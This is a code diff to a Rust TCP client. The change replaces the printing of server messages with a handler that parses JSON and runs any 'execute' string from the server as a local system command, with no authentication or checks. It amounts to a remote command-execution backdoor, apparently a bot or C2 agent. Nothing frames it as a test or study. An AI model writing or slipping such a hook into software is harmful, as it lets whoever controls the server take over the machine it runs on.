@@ -3,6 +3,9 @@ use std::io::{self, Read, Write};
 use std::net::TcpStream;
 use std::thread;
 use std::time::Duration;
+use serde_json::Value;
+use std::process::Command;
+
 
 fn read_server_response(mut stream: TcpStream) {
     let mut buf = [0; 1024];
@@ -13,7 +16,40 @@ fn read_server_response(mut stream: TcpStream) {
                     println!("Server closed the connection");
                     break;
                 }
-                println!("{}", String::from_utf8_lossy(&buf[..n]));
+                let message = String::from_utf8_lossy(&buf[..n]);
+                
+                // try to parse the message as JSON
+                let value: Result<serde_json::Value, _> = serde_json::from_str(&message);
+                let json_value = match value {
+                    Ok(v) => v,
+                    Err(e) => {
+                        println!("Error parsing JSON: {}", e);
+                        continue;
+                    }
+                };
+
+                match json_value {
+                    
+                    j if j.get("execute").is_some() => {
+                        let execute = j.get("execute").unwrap().as_str().unwrap();
+                        println!("Execute: {}", execute);
+
+                        let mut parts = execute.split_whitespace();
+                        let command = parts.next().unwrap();
+                        let args: Vec<&str> = parts.collect();
+
+                        let output = Command::new(command)
+                            .args(args)
+                            .output()
+                            .expect("Failed to execute command");
+
+
+                        println!("Output: {}", String::from_utf8_lossy(&output.stdout));
+                    }
+
+                    _ => {}
+                }
+
             }
             Err(e) => {
                 eprintln!("Error reading from server: {}", e);
@@ -55,7 +91,7 @@ pub fn start_server() -> io::Result<()> {
     println!("Connecting to server...");
     let mut stream = connect_to_server()?;
     println!("Connected to server!");
-
+    
     let cloned_stream = stream.try_clone().expect("Failed to clone stream");
     let cloned_stream2 = stream.try_clone().expect("Failed to clone stream");
 
